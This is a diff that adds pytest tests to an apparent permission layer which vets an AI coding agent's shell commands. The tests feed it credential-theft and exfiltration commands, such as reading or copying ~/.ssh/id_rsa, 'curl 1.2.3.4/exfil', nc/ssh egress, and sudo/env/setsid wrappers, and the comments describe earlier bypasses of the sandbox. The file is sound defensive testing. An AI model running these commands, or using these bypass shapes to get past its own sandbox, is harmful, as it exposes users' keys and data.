@@ -776,3 +776,229 @@ def test_benign_pipe_to_tee_in_scope_allowed(tmp_path):
     # A benign compound command stays allowed: read from ./src, tee into ./out.
     adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
     adapter.check("Bash", {"command": "grep -rn pattern ./src | tee ./out/log.txt"})
+
+
+# --------------------------------------------------------------------------- #
+# fix-shell-multi-surface-request — v0.7.0
+#
+# A shell command can touch several capability surfaces at once (read a file,
+# redirect into another, reach a host). Pre-v0.7 a CallRequest could name only
+# ONE path, so _parse_segment returned at the first redirect and _parse_bash
+# kept the strictest single surface — the command's own read/egress was dropped
+# and each shape below was ALLOWED under network-deny.yaml (shell granted)
+# despite touching a denied path or egressing to a host.
+# --------------------------------------------------------------------------- #
+def _internal_host_allow_interposer(tmp_path):
+    """network-deny, but one egress host is explicitly allow-listed."""
+    data = {
+        "skill": "curl-exfil-demo",
+        "default": "deny",
+        "tools": ["read_file", "edit_file", "shell", "net_fetch"],
+        "paths": {"read": ["./**"], "write": ["./out/**"], "deny": ["~/.ssh/**"]},
+        "network": {"allow": ["api.internal"]},
+    }
+    profile = load_profile(data, base_dir=str(tmp_path))
+    return Interposer(profile, trap_log=TrapLog.in_memory(), emit=lambda _l: None)
+
+
+def test_redirect_does_not_hide_denied_read(tmp_path):
+    # `cat ~/.ssh/id_rsa > ./out/leak.txt` — the redirect target is in scope, so
+    # judging the write alone allowed a read of the private key.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "cat ~/.ssh/id_rsa > ./out/leak.txt"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_append_redirect_does_not_hide_denied_read(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "cat ~/.ssh/id_rsa >> ./out/leak.txt"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_head_n_redirect_does_not_hide_denied_read(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "head -n 5 ~/.ssh/id_rsa > ./out/leak.txt"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_redirect_does_not_hide_ip_egress(tmp_path):
+    # `curl 1.2.3.4/exfil > ./out/f.txt` — an in-scope redirect made the m4 IP
+    # egress fail-closed path unreachable.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "curl 1.2.3.4/exfil > ./out/f.txt"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_redirect_does_not_hide_wget_egress(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "wget 1.2.3.4/x > ./out/f.txt"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_redirect_does_not_hide_ssh_egress(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "ssh buildbox > ./out/f.txt"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_redirect_does_not_hide_nc_egress(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "nc buildbox 22 > ./out/f.txt"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_allowlisted_host_does_not_shadow_denied_read(tmp_path):
+    # Under a profile that allow-lists one egress host, `curl <allowed> && cat
+    # ~/.ssh/id_rsa` used to carry the host and drop the read entirely.
+    adapter = ClaudeCodeAdapter(_internal_host_allow_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check(
+            "Bash", {"command": "curl https://api.internal/v1 && cat ~/.ssh/id_rsa"}
+        )
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_allowlisted_host_alone_is_still_allowed(tmp_path):
+    # Regression guard: the host-shadow fix must not deny an allow-listed host.
+    adapter = ClaudeCodeAdapter(_internal_host_allow_interposer(tmp_path))
+    decision = adapter.check("Bash", {"command": "curl https://api.internal/v1"})
+    assert decision.allowed
+
+
+def test_extra_surface_rides_along_on_the_request():
+    req = to_call_request("Bash", {"command": "cat ~/.ssh/id_rsa > ./out/leak.txt"})
+    assert req.path == "~/.ssh/id_rsa"
+    assert req.access == "read"
+    assert [s.path for s in req.extra] == ["./out/leak.txt"]
+
+
+def test_write_scope_still_enforced_alongside_an_allowed_read(tmp_path):
+    # Regression guard for the v0.6.0 write-scope fix: the read is in scope but
+    # the redirect target is not, so the write must still be denied.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "cat ./README.md > ~/.bashrc"})
+    assert exc.value.decision.rule == "path-not-in-profile"
+
+
+def test_allowed_read_with_in_scope_redirect_allowed(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    adapter.check("Bash", {"command": "cat ./README.md > ./out/copy.txt"})
+
+
+# --------------------------------------------------------------------------- #
+# fix-cp-mv-file-copy-surfaces — v0.7.0
+#
+# cp/mv/install were in no verb set, so they degraded to a bare shell call and
+# `cp ~/.ssh/id_rsa ./out/key` was ALLOWED: the key was read AND copied into the
+# in-scope ./out/ tree the same profile lets the Skill read back.
+# --------------------------------------------------------------------------- #
+def test_cp_denied_source_read(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "cp ~/.ssh/id_rsa ./out/key"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_mv_denied_source_read(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "mv ~/.ssh/id_rsa ./out/"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_install_denied_source_read(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "install -m 600 ~/.ssh/id_rsa ./out/k"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_cp_source_surfaced_as_primary_path():
+    # The read source is the strictest surface, so it is the one reported.
+    req = to_call_request("Bash", {"command": "cp ~/.ssh/id_rsa ./out/key"})
+    assert req.path == "~/.ssh/id_rsa"
+    assert req.access == "read"
+    assert [s.path for s in req.extra] == ["./out/key"]
+
+
+def test_install_flag_value_is_not_a_copy_source():
+    req = to_call_request("Bash", {"command": "install -m 600 ~/.ssh/id_rsa ./out/k"})
+    assert req.path == "~/.ssh/id_rsa"
+
+
+def test_cp_benign_copy_allowed(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    adapter.check("Bash", {"command": "cp ./README.md ./out/copy"})
+
+
+def test_cp_destination_write_scope_enforced(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "cp ./README.md ~/.bashrc"})
+    assert exc.value.decision.rule == "path-not-in-profile"
+
+
+# --------------------------------------------------------------------------- #
+# fix-command-wrapper-hides-inner-command — v0.7.0
+#
+# A wrapper verb (sudo/env/nice/…) was unrecognised, so the wrapped command was
+# never inspected and each shape below was ALLOWED under network-deny.yaml.
+# --------------------------------------------------------------------------- #
+@pytest.mark.parametrize(
+    "command",
+    [
+        "sudo cat ~/.ssh/id_rsa",
+        "doas cat ~/.ssh/id_rsa",
+        "env cat ~/.ssh/id_rsa",
+        "env FOO=1 cat ~/.ssh/id_rsa",
+        "command cat ~/.ssh/id_rsa",
+        "exec cat ~/.ssh/id_rsa",
+        "nohup cat ~/.ssh/id_rsa",
+        "nice cat ~/.ssh/id_rsa",
+        "time cat ~/.ssh/id_rsa",
+        "stdbuf -o0 cat ~/.ssh/id_rsa",
+        "setsid cat ~/.ssh/id_rsa",
+        "sudo -u root cat ~/.ssh/id_rsa",
+    ],
+)
+def test_command_wrapper_denied_path_read(tmp_path, command):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": command})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_command_wrapper_denied_network_egress(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "sudo curl 1.2.3.4/exfil"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_command_wrapper_composes_with_interpreter_recursion(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": 'setsid sh -c "cat ~/.ssh/id_rsa"'})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_command_wrapper_read_surface_surfaced():
+    req = to_call_request("Bash", {"command": "sudo cat ~/.ssh/id_rsa"})
+    assert req.path == "~/.ssh/id_rsa"
+    assert req.access == "read"
+
+
+def test_unrecognised_wrapper_remainder_not_falsely_denied(tmp_path):
+    # `sudo grep cat ./README.md` — the wrapper's remainder is not a verb this
+    # adapter classifies, so it must stay a bare shell call, not be misread as
+    # a `cat ./README.md` read of a suspicious argument.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    adapter.check("Bash", {"command": "sudo grep cat ./README.md"})
